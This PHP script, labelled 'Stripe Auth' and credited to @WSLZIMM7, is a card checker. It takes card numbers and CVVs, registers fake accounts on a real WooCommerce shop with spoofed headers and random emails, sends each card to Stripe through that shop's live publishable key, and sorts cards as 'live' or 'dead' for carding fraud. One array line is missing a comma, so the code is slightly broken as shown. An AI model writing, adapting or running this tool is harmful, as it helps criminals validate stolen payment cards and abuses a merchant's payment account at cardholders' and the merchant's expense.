<?php

ob_start();

$Gate = 'Stripe Auth';

#/// API Made By: @WSLZIMM7 



$credits = "@WSLZIMM7";
$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];





error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}

header('Content-Type: application/json; charset=utf-8');

function parseX($data, $start, $end) {
    $star = strpos($data, $start);
    if ($star === false) {
        return "None";
    }
    $star += strlen($start);
    $last = strpos($data, $end, $star);
    if ($last === false) {
        return "None";
    }
    return substr($data, $star, $last - $star);
}

function generate_email_from_api() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (!$data || !isset($data['results'][0])) {

        return generate_email_local();
    }
    
    $user = $data['results'][0];
    $first_name = strtolower($user['name']['first']);
    $last_name = strtolower($user['name']['last']);
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
    $domain = $domains[array_rand($domains)];
    
    $formats = [
        $first_name . '.' . $last_name,
        $first_name . $last_name,
        $first_name[0] . $last_name,
        $first_name . $last_name[0],
        $first_name . '_' . $last_name,
        $first_name . '-' . $last_name
    ];
    
    $email_base = $formats[array_rand($formats)];
    $random_num = rand(10, 999);
    
    return $email_base . $random_num . '@' . $domain;
}

function generate_email_local() {
    $first_names = ['john', 'jane', 'michael', 'sarah', 'david', 'lisa', 'robert', 'emily', 'william', 'jennifer'];
    $last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez'];
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
    
    $first_name = $first_names[array_rand($first_names)];
    $last_name = $last_names[array_rand($last_names)];
    $domain = $domains[array_rand($domains)];
    
    $formats = [
        $first_name . '.' . $last_name,
        $first_name . $last_name,
        $first_name[0] . $last_name,
        $first_name . $last_name[0],
        $first_name . '_' . $last_name,
        $first_name . '-' . $last_name
    ];
    
    $email_base = $formats[array_rand($formats)];
    $random_num = rand(10, 999);
    
    return $email_base . $random_num . '@' . $domain;
}

function generate_password($length = 12, $include_uppercase = true, $include_lowercase = true, $include_numbers = true, $include_symbols = true) {
    $characters = '';
    
    if ($include_lowercase) {
        $characters .= 'abcdefghijklmnopqrstuvwxyz';
    }
    
    if ($include_uppercase) {
        $characters .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    }
    
    if ($include_numbers) {
        $characters .= '0123456789';
    }
    
    if ($include_symbols) {
        $characters .= '!@#$%^&*()_+-=[]{}|;:,.<>?';
    }
    
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $characters[rand(0, strlen($characters) - 1)];
    }
    
    return $password;
}

function Gen_Randi_U_A() {
    $platforms = ['Windows NT', 'Macintosh', 'Linux', 'Android', 'iOS'];
    $browsers = ['Mozilla', 'Chrome', 'Opera', 'Safari', 'Edge', 'Firefox'];
    $platform = $platforms[array_rand($platforms)];
    $version = rand(11, 99) . '.' . rand(11, 99);
    $browser = $browsers[array_rand($browsers)];
    $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
    return "$browser/5.0 ($platform " . rand(11, 99) . ".0; Win64; x64) AppleWebKit/$version (KHTML, like Gecko) $browser/$version.$chromeVersion Safari/$version." . rand(11, 99);
}

$cookieFile = getcwd().'/cookie.txt';


$headers1 = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.8',
    'cache-control: max-age=0',
    'priority: u=0, i',
    'sec-ch-ua: "Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://redbluechair.com/my-account/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response1 = curl_exec($ch);
$httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if (!$response1 || $httpCode1 != 200) {
    echo json_encode([
        "card" => substr($cc, 0, 6) . "******" . substr($cc, -4),
        "month" => $mes,
        "year" => $ano,
        "cvv" => $cvv,
        "status" => "error",
        "message" => "Failed to load account page",
        "gateway" => "Stripe",
        "type" => "auth"
    ], JSON_PRETTY_PRINT);
    exit;
}

$register_nonce = parseX($response1, 'name="woocommerce-register-nonce" value="', '"');

if (empty($register_nonce) || $register_nonce == "None") {
    echo json_encode([
        "card" => substr($cc, 0, 6) . "******" . substr($cc, -4),
        "month" => $mes,
        "year" => $ano,
        "cvv" => $cvv,
        "status" => "error",
        "message" => "Failed to extract registration nonce",
        "gateway" => "Stripe",
        "type" => "auth"
    ], JSON_PRETTY_PRINT);
    exit;
}

sleep(1);


$email = generate_email_from_api();
$password = generate_password();

$headers2 = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.8',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://redbluechair.com',
    'priority: u=0, i',
    'referer: https://redbluechair.com/my-account/',
    'sec-ch-ua: "Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];

$data2 = [
    'email' => $email,
    'password' => $password,
    'woocommerce-register-nonce' => $register_nonce,
    '_wp_http_referer' => '/my-account/',
    'register' => 'Register',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://redbluechair.com/my-account/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data2));
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response2 = curl_exec($ch);
$httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

sleep(1);


$headers3 = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.8',
    'priority: u=0, i',
    'referer: https://redbluechair.com/my-account/payment-methods/',
    'sec-ch-ua: "Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://redbluechair.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers3);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response3 = curl_exec($ch);
$httpCode3 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$method_nonce = parseX($response3, 'name="woocommerce-add-payment-method-nonce" value="', '"');
$intent_nonce = parseX($response3, '"createSetupIntentNonce":"', '"');

if (empty($method_nonce) || $method_nonce == "None" || empty($intent_nonce) || $intent_nonce == "None") {
    echo json_encode([
        "card" => substr($cc, 0, 6) . "******" . substr($cc, -4),
        "month" => $mes,
        "year" => $ano,
        "cvv" => $cvv,
        "status" => "error",
        "message" => "Failed to extract payment method nonces",
        "gateway" => "Stripe",
        "type" => "auth"
    ], JSON_PRETTY_PRINT);
    exit;
}

sleep(1);


$stripe_email = generate_email_from_api();

$headers4 = [
    'accept: application/json',
    'accept-language: en-US,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'priority: u=1, i',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];


$stripe_data = [
    'billing_details[name]' => '+',
    'billing_details[email]' => $stripe_email
    'billing_details[address][country]' => 'US',
    'billing_details[address][postal_code]' => '10080',
    'type' => 'card',
    'card[number]' => $cc,
    'card[cvc]' => $cvv,
    'card[exp_year]' => $ano,
    'card[exp_month]' => $mes,
    'allow_redisplay' => 'unspecified',
    'pasted_fields' => 'number',
    'payment_user_agent' => 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
    'referrer' => 'https://redbluechair.com',
    'time_on_page' => '67040',
    'client_attribution_metadata[client_session_id]' => '779e4fea-bb16-4f64-9b63-8b6016b302c6',
    'client_attribution_metadata[merchant_integration_source]' => 'elements',
    'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
    'client_attribution_metadata[merchant_integration_version]' => '2021',
    'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
    'client_attribution_metadata[payment_method_selection_flow]' => 'merchant_specified',
    'client_attribution_metadata[elements_session_config_id]' => '35de27e3-14f9-4657-9d14-2de5d6574bc9',
    'client_attribution_metadata[merchant_integration_additional_elements][0]' => 'payment',
    'guid' => 'eb69d6da-71d9-4c0b-b3ac-c78cacc8554ace1414',
    'muid' => '7e1c3a72-1ca0-4913-bea1-1e1a905fd25ee5fd1b',
    'sid' => 'a8c2b37d-1212-431d-8ff9-05cd04b7dcd95436eb',
    'key' => 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
    '_stripe_account' => 'acct_1Mpulb2El1QixccJ'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers4);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($stripe_data));
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response4 = curl_exec($ch);
$httpCode4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$response4_data = json_decode($response4, true);

if (!$response4_data || !isset($response4_data['id'])) {
    $error_msg = isset($response4_data['error']['message']) ? $response4_data['error']['message'] : 'Failed to create payment method';

    if (stripos($error_msg, 'email') !== false || stripos($error_msg, 'Invalid email') !== false) {

        $stripe_email = 'test' . rand(1000, 9999) . '@gmail.com';
        $stripe_data['billing_details[email]'] = $stripe_email;
        
      
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers4);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($stripe_data));
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        
        $response4 = curl_exec($ch);
        $httpCode4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $response4_data = json_decode($response4, true);
    }
    
    if (!$response4_data || !isset($response4_data['id'])) {
        $error_msg = isset($response4_data['error']['message']) ? $response4_data['error']['message'] : 'Failed to create payment method';
        
        echo json_encode([
            "card" => substr($cc, 0, 6) . "******" . substr($cc, -4),
            "month" => $mes,
            "year" => $ano,
            "cvv" => $cvv,
            "status" => "dead",
            "message" => $error_msg,
            "gateway" => "Stripe",
            "type" => "auth"
        ], JSON_PRETTY_PRINT);
        exit;
    }
}

$payment_id = $response4_data['id'];

sleep(1);



$headers5 = [
    'accept: */*',
    'accept-language: en-US,en;q=0.8',
    'origin: https://redbluechair.com',
    'priority: u=1, i',
    'referer: https://redbluechair.com/my-account/add-payment-method/',
    'sec-ch-ua: "Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];

$data5 = [
    'action' => 'create_setup_intent',
    'wcpay-payment-method' => $payment_id,
    '_ajax_nonce' => $intent_nonce,
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://redbluechair.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers5);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data5));
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response5 = curl_exec($ch);
$httpCode5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$response5_data = json_decode($response5, true);

$status = "declined";
$message = "";

if ($response5_data && isset($response5_data['success'])) {
    if ($response5_data['success']) {
        $status = "Approved";
        $message = "1000 Approved";
    } else {
        $error_msg = isset($response5_data['data']['error']['message']) ? $response5_data['data']['error']['message'] : 'Unknown error';
        
    
        if (stripos($error_msg, 'security code') !== false || stripos($error_msg, 'cvc') !== false) {
            $status = "live";
            $message = "Security code incorrect";
        } elseif (stripos($error_msg, 'insufficient funds') !== false) {
            $status = "live";
            $message = "Insufficient funds";
        } elseif (stripos($error_msg, 'declined') !== false || stripos($error_msg, 'card was declined') !== false) {
            $status = "dead";
            $message = "Your card was declined";
        } elseif (stripos($error_msg, 'invalid') !== false) {
            $status = "dead";
            $message = "Invalid card";
        } else {
            $status = "dead";
            $message = $error_msg;
        }
    }
} else {
    $status = "error";
    $message = "Invalid response from server";
}


$result = [
    "card" => substr($cc, 0, 6) . "******" . substr($cc, -4),
    "month" => $mes,
    "year" => $ano,
    "cvv" => $cvv,
    "status" => $status,
    "message" => $message,
    "gateway" => "Stripe",
    "type" => "auth"
];

echo json_encode($result, JSON_PRETTY_PRINT);

if (file_exists($cookieFile)) {
    @unlink($cookieFile);
}

ob_end_flush();

?>